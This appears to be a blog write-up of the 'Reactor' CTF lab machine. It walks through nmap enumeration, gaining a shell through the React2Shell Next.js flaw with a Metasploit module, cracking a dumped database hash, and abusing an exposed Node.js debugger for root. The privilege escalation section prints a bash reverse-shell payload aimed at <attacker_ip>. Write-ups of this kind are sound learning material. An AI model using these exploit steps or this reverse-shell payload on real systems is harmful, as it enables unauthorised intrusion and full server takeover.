+++
date = '2026-09-29T13:28:52+02:00'
draft = true
title = 'Reactor Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`24/05/2026`**

![pwn.jpeg](/images/imgs_reactor/pwn.jpeg)

---
# Introduction

**_Reactor_** is the first machine released during **Season 11**.
It’s an **Easy-level Linux** box that focuses on exploiting a recent vulnerability in **Next.js/React applications**: **React2Shell** (**CVE-2025-55182**).

In this case, the vulnerability is abused to gain initial access via **Metasploit**, obtaining a shell as the **node** user.

The privilege escalation requires first a lateral movement to the **engineer** user by dumping an internal database and cracking their hash, and then a vertical escalation to **root** by abusing an exposed **Node.js debugger** service running locally.

---
# Techniques Used

- **React2Shell (CVE-2025-55182) → RCE**

- **Database Dump → Hash Cracking**

- **Node.js Debugger Abuse → Root RCE**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -p- -vvv reactor.htb
```

```text
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp  open  ppp?     syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
```

**Open ports**:

- **22**/tcp SSH

- **3000**/tcp HTTP (**`Next.js/React`**)

## HTTP - Web Enumeration

By navigating to port **`3000`**, we find a **React-based** web application.

![reactor_web.png](/images/imgs_reactor/reactor_web.png)

Given the box name and the exposed **React-based** application, I immediately suspected it might be vulnerable to **React2Shell (CVE-2025-55182)**.

**Note**: _This is a critical **Unauthenticated Remote Code Execution** vulnerability affecting specific versions of the **`Next.js`** framework. The flaw arises from improper handling and sanitization of user-supplied data during **Server-Side Rendering** (**SSR**) or internal request parsing. By sending a maliciously crafted HTTP request, an attacker can force the backend **`Node.js`** environment to evaluate and **execute arbitrary code**, fully compromising the host server._

---
# Initial Access | React2Shell → RCE

A quick test confirmed the hypothesis, I fired up **Metasploit** and searched for the specific module.

```bash
msfconsole
msf6 > search react2shell
msf6 > use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
msf6 > set RHOSTS reactor.htb
msf6 > set RPORT 3000
msf6 > set LHOST <attacker_ip>
msf6 > exploit
```

The exploit granted me a **Meterpreter** session as the **`node`** user.

![initial_access.png](/images/imgs_reactor/initial_access.png)

---
# Lateral Movement | Database Dump → Hash Cracking → engineer

I retrieved the **`/etc/passwd`** file to see which users were on the box.

![passwd.png](/images/imgs_reactor/passwd.png)

While exploring the file system, I found and downloaded the internal database.

![db_find.png](/images/imgs_reactor/db_find.png)

Inside it, I managed to extract a password hash for the user **`engineer`**.

![db_dump.png](/images/imgs_reactor/db_dump.png)

After extracting the hash, I cracked it using [CrackStation](https://crackstation.net/).

![crackstation.png](/images/imgs_reactor/crackstation.png)

I then used the recovered credentials to log in via **SSH**:

```bash
ssh engineer@reactor.htb
```

Inside the home directory, I found the **user flag**:

![lateral_user_flag.png](/images/imgs_reactor/lateral_user_flag.png)

---
# Privilege Escalation | Node.js Debugger Abuse → root

As the **`engineer`** user, I started my basic local enumeration. **linpeas** didn't yield anything immediately useful, and known kernel exploits like **`Dirty Pipe/Dirty Frag`** were patched.

I then checked for internal listening ports:

```bash
ss -tuln
```

![tunnel.png](/images/imgs_reactor/tunnel.png)

Port **`9229`** immediately caught my attention. This is the default port for the **`Node.js` Inspector (Debugger)**.

![inspect_process.png](/images/imgs_reactor/inspect_process.png)

Initially, I tried port forwarding via **SSH** to access it from my browser, but it didn't lead to any web-based interaction.

![9229.png](/images/imgs_reactor/9229.png)

![noresponse.png](/images/imgs_reactor/noresponse.png)

After some research on how to abuse an exposed **`Node.js` debugger**, I found that you can interact with it directly from the **CLI** to **execute arbitrary JavaScript code**.

Using the built-in node inspect command, I connected to the local debugger:

```bash
node inspect 127.0.0.1:9229
```

Once inside the debugging session, we can execute system commands by leveraging the **`child_process`** module. I crafted a payload to trigger a reverse shell back to my attacker machine:

```javascript
exec("process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1\"')")
```

After setting up a **netcat** listener on my machine and executing the payload in the inspector console, I caught the **root** shell:

![privesc.png](/images/imgs_reactor/privesc.png)

The root flag was retrieved from **`/root`**.

---
# Final Thoughts

A very straightforward but fun box.

The initial access was heavily hinted at by the machine's name itself. Spotting a **React** application on a box named **Reactor** immediately narrowed down the attack surface, leading straight to the recent **React2Shell CVE**. It’s a classic CTF scenario where intuition saves you hours of blind enumeration.

The privilege escalation was the real highlight. Finding and abusing an exposed **Node.js debugger** on an internal port is a very realistic vector and a cool technique to exploit, which highly rewards thorough local enumeration.

**Sources**:

- **React2Shell Exploit Info | https://react2shell.com/**

- **Node.js Debugger Exploitation | https://hacktricks.wiki/en/linux-hardening/software-information/electron-cef-chromium-debugger-abuse.html**